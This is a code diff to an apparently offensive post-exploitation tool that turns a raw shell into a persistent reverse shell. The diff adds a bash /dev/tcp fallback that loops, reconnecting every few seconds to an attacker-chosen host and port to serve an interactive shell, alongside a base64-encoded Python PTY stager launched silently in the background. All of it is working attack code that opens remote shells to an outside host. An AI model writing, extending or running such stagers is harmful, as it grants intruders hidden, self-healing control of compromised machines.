@@ -38,7 +38,7 @@ def _stager(lhost: str, port: str, token: str, tls: bool) -> str:
         " s=None;pid=0\n"
         " try:\n"
         f"  {connect}\n"
-        '  s.send(b"RECCE1 "+T.encode()+b"\\n")\n'
+        '  s.send(b"RECCE1 "+T.encode()+b" pty\\n")\n'
         "  pid,fd=pty.fork()\n"
         '  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])\n'
         "  sz(fd,40,120)\n"
@@ -81,12 +81,22 @@ def stager_template(tls: bool) -> str:
 
 
 def upgrade_command(lhost: str, port: int, token: str, tls: bool = False) -> str:
-    """A single line to inject into a RAW shell: pick the first available python and background
-    the reconnecting-PTY stager (detection tries python3 → python → python2)."""
+    """A single line to inject into a RAW shell, pwncat-style method detection:
+      1. python (python3/python/python2) → full reconnecting-PTY stager (best)
+      2. bash /dev/tcp → a reconnecting shell with the token but no PTY (very common fallback)
+      3. neither → RECCE_NO_METHOD
+    Each backgrounds a self-healing loop, so the weak shell upgrades itself in place."""
     body = _stager(lhost, str(port), token, tls)
     b64 = base64.b64encode(body.encode()).decode()
+    # bash fallback: reconnecting (non-PTY) shell, announces the token WITHOUT the pty flag
+    bash_fb = (
+        "bash -c '(while :; do exec 3<>/dev/tcp/" + lhost + "/" + str(port) + " 2>/dev/null && "
+        'printf "RECCE1 ' + token + '\\n" >&3 && bash -i <&3 >&3 2>&3; '
+        "exec 3<&- 3>&- 2>/dev/null; sleep 5; done) &' 2>/dev/null"
+    )
     return (
-        "PY=$(command -v python3||command -v python||command -v python2); "
-        f'[ -n "$PY" ] && (echo {b64} | base64 -d | "$PY" - >/dev/null 2>&1 &) '
-        '&& echo RECCE_UPGRADE_SENT || echo RECCE_NO_PYTHON'
+        'PY=$(command -v python3||command -v python||command -v python2); '
+        f'if [ -n "$PY" ]; then (echo {b64} | base64 -d | "$PY" - >/dev/null 2>&1 &); echo RECCE_UPGRADE_SENT; '
+        f'elif command -v bash >/dev/null 2>&1; then {bash_fb}; echo RECCE_UPGRADE_SENT; '
+        'else echo RECCE_NO_METHOD; fi'
     )
